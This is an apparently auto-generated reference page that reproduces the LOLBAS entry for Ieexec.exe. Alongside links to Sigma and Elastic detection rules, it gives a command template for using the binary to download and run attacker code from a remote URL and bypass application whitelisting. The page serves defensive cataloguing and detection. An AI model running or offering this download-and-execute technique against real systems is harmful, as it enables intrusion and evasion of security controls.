---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Ieexec.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `ieexec.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ieexec.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Ieexec.exe](../../tools/windows/ieexec.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ieexec.exe |
| name | Ieexec.exe |
| type | tool |
| source | lolbas |
| url | https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
Author: Oddvar Moe
Commands:
- Category: Download
  Command: ieexec.exe {REMOTEURL:.exe}
  Description: Downloads and executes executable from the remote server.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  Privileges: User
  Tags:
  - Execute: Remote
  - Execute: EXE (.NET)
  Usecase: Download and run attacker code from remote location
- Category: Execute
  Command: ieexec.exe {REMOTEURL:.exe}
  Description: Downloads and executes executable from the remote server.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  Privileges: User
  Tags:
  - Execute: Remote
  - Execute: EXE (.NET)
  Usecase: Download and run attacker code from remote location
Created: 2018-05-25
Description: The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the
  .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using
  a URL.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- IOC: Network connections originating from ieexec.exe may be suspicious
Full_Path:
- Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe
Name: Ieexec.exe
Resources:
- Link: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ieexec.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
```

```text
IOC: Network connections originating from ieexec.exe may be suspicious
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- IOC: Network connections originating from ieexec.exe may be suspicious
```
